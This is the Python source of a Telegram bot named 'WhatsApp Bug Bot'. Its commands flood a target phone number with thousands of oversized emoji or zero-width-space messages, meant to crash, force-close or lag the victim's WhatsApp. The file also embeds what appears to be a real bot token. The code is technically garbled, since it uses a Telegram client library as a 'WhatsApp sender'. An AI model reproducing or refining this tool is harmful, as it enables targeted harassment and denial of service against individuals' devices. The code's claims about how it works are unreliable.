import os
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from pyrogram import Client
from pyrogram.errors import FloodWait

# Telegram Bot Token
TOKEN = "8862738557:AAHv9zZ6ZLCYLTpMkq87GvIP77YNr4y5wro"

# WhatsApp Sender (Pyrogram Client)
whatsapp_sender = None
sender_connected = False

# Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Payloads (5000 per command)
CRASH_PAYLOAD = "🔥" * 5000 # Crash payload (emoji spam)
FC_INVIS_PAYLOAD = "\u200B" * 5000 # Invisible zero-width space (force close)
DELAY_HARD_PAYLOAD = "🚀" * 5000 # Delay payload (lag)

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 keyboard = [
 [InlineKeyboardButton("🔌 Connect Sender (/connect)", callback_data="connect")],
 [InlineKeyboardButton("💥 Crash Android (/crashandroid)", callback_data="crash")],
 [InlineKeyboardButton("👻 FC Invisible (/fcinvis)", callback_data="fcinvis")],
 [InlineKeyboardButton("⏳ Delay Hard (/delayhard)", callback_data="delay")]
 ]
 reply_markup = InlineKeyboardMarkup(keyboard)

 await update.message.reply_text(
 "🚀 **WhatsApp Bug Bot**\n\n"
 "⚠ **Connect a WhatsApp sender first (/connect)**\n\n"
 "🔹 **Commands:**\n"
 "• `/crashandroid 628xxx` → Crash target WhatsApp\n"
 "• `/fcinvis 628xxx` → Force close (invisible)\n"
 "• `/delayhard 628xxx` → Extreme lag/delay\n"
 "• `/connect` → Link WhatsApp sender",
 reply_markup=reply_markup
 )

# Connect WhatsApp Sender
async def connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
 await update.message.reply_text(
 "🔌 **Connect WhatsApp Sender**\n\n"
 "1. Install **WhatsApp Business API** or **Pyrogram** on your device.\n"
 "2. Get a **pairing code** (use `python3 -m pyrogram`)\n"
 "3. Send the pairing code here: `/connect 123456`"
 )

async def handle_connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
 global whatsapp_sender, sender_connected

 if not context.args:
 await update.message.reply_text("❌ **Usage:** `/connect <pairing_code>`")
 return

 pairing_code = context.args[0]

 try:
 whatsapp_sender = Client(
 "whatsapp_sender",
 api_id=12345, # Replace with your API ID
 api_hash="your_api_hash", # Replace with your API hash
 phone_number="+628xxx", # Your WhatsApp number
 in_memory=True
 )

 await whatsapp_sender.connect()
 await whatsapp_sender.send_code(pairing_code)
 await whatsapp_sender.sign_in(pairing_code)

 sender_connected = True
 await update.message.reply_text("✅ **WhatsApp sender connected!**\n\nNow you can use bug commands.")
 except Exception as e:
 await update.message.reply_text(f"❌ **Error:** {e}")

# Bug Commands (Crash, FC Invisible, Delay Hard)
async def crash_android(update: Update, context: ContextTypes.DEFAULT_TYPE):
 if not sender_connected:
 await update.message.reply_text("❌ **Error:** Connect a WhatsApp sender first (`/connect`)")
 return

 if not context.args:
 await update.message.reply_text("❌ **Usage:** `/crashandroid 628xxx`")
 return

 target = context.args[0]
 await update.message.reply_text(f"💥 **Sending 5000 crash payloads to {target}...**")

 try:
 for _ in range(5000):
 await whatsapp_sender.send_message(target, CRASH_PAYLOAD)
 await update.message.reply_text("✅ **Crash payloads sent!**")
 except FloodWait as e:
 await update.message.reply_text(f"⚠ **Flood wait:** {e.value} seconds")
 except Exception as e:
 await update.message.reply_text(f"❌ **Error:** {e}")

async def fc_invisible(update: Update, context: ContextTypes.DEFAULT_TYPE):
 if not sender_connected:
 await update.message.reply_text("❌ **Error:** Connect a WhatsApp sender first (`/connect`)")
 return

 if not context.args:
 await update.message.reply_text("❌ **Usage:** `/fcinvis 628xxx`")
 return

 target = context.args[0]
 await update.message.reply_text(f"👻 **Sending 5000 invisible FC payloads to {target}...**")

 try:
 for _ in range(5000):
 await whatsapp_sender.send_message(target, FC_INVIS_PAYLOAD)
 await update.message.reply_text("✅ **FC invisible payloads sent!**")
 except FloodWait as e:
 await update.message.reply_text(f"⚠ **Flood wait:** {e.value} seconds")
 except Exception as e:
 await update.message.reply_text(f"❌ **Error:** {e}")

async def delay_hard(update: Update, context: ContextTypes.DEFAULT_TYPE):
 if not sender_connected:
 await update.message.reply_text("❌ **Error:** Connect a WhatsApp sender first (`/connect`)")
 return

 if not context.args:
 await update.message.reply_text("❌ **Usage:** `/delayhard 628xxx`")
 return

 target = context.args[0]
 await update.message.reply_text(f"⏳ **Sending 5000 delay payloads to {target}...**")

 try:
 for _ in range(5000):
 await whatsapp_sender.send_message(target, DELAY_HARD_PAYLOAD)
 await update.message.reply_text("✅ **Delay payloads sent!**")
 except FloodWait as e:
 await update.message.reply_text(f"⚠ **Flood wait:** {e.value} seconds")
 except Exception as e:
 await update.message.reply_text(f"❌ **Error:** {e}")

# Button Handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 query = update.callback_query
 await query.answer()

 if query.data == "connect":
 await connect(update.callback_query, context)
 elif query.data == "crash":
 await query.edit_message_text("💥 **Crash Command:** `/crashandroid 628xxx`")
 elif query.data == "fcinvis":
 await query.edit_message_text("👻 **FC Invisible Command:** `/fcinvis 628xxx`")
 elif query.data == "delay":
 await query.edit_message_text("⏳ **Delay Hard Command:** `/delayhard 628xxx`")

# Main Function
def main():
 application = Application.builder().token(TOKEN).build()

 # Command Handlers
 application.add_handler(CommandHandler("start", start))
 application.add_handler(CommandHandler("connect", handle_connect))
 application.add_handler(CommandHandler("crashandroid", crash_android))
 application.add_handler(CommandHandler("fcinvis", fc_invisible))
 application.add_handler(CommandHandler("delayhard", delay_hard))

 # Button Handler
 application.add_handler(CallbackQueryHandler(button_handler))

 # Start Bot
 application.run_polling()

if __name__ == "__main__":
 main()